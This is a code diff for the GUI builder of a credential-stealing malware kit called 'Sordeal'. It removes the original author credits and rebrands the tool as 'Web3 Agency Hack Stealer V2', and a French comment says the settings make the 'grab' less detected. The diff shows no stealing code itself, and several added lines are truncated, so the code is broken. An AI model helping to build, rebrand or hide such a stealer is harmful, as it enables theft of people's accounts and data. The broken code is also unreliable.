@@ -19,12 +19,6 @@ custom_username = ""
 # ça permet de rendre le grab "customizable" et moins detecté
 
 
-#############################################################################################################################
-############################################ Clean@Builder: v2 ##############################################################
-############################################ Clean@Author: https://github.com/NolayDsc ######################################
-############################################ Clean@Code: For Sordeal ########################################################
-#############################################################################################################################
-
 
 
 # DISCORD RPC
@@ -50,12 +44,12 @@ def update():
 
 data = {
      'state':"Build Some Shit",
-     'details':"with Sordeal-Builder V4",
-     'large_image':"sordeal1", 
+     'details':"with Web3 Agency Hack Stealer V2",
+     'large_image':"Web3 Agency Hack", 
      'large_text':None, 
-     'small_image':"sordeal2", 
+     'small_image':"Web3 Agency Hack", 
      'small_text':None, 
-     'buttons':[{"label": "Github", "url": "https://github.com/Sordeal-Stealer"}, {"label": "Discord", "url": "https://discord.gg/sordeal"}],
+     'buttons':[{"label": "Github", "url": 
      'time': 1
       }
 update()
@@ -78,21 +72,21 @@ class Sordeal(customtkinter.CTk):
         self.icon_name = ""
         self.pingtype = "none"
 
-        self.iconname = "Sordeal_assets\img\sordeal.ico"
+        self.iconname = "Sordeal_assets\img\
         super().__init__()
         self.protocol("WM_DELETE_WINDOW", self.on_close)
 
         #title, icon
         self.title("Sordeal - Builder")
         self.geometry("820x420")
-        self.iconbitmap("Sordeal_assets\img\logo.ico")
+        self.iconbitmap("")
 
         #base
         self.grid_rowconfigure(0, weight=1)
         self.grid_columnconfigure(1, weight=1)
 
         #path img
-        image_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "Sordeal_assets\img")
+        image_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "")
         self.logo = customtkinter.CTkImage(Image.open(os.path.join(image_path, "logo.png")), size=(80, 80))
         self.logo_ab = customtkinter.CTkImage(Image.open(os.path.join(image_path, "logo.png")), size=(200, 200))
         self.bg_all = customtkinter.CTkImage(Image.open(os.path.join(image_path, "black_bg.png")), size=(680, 420))
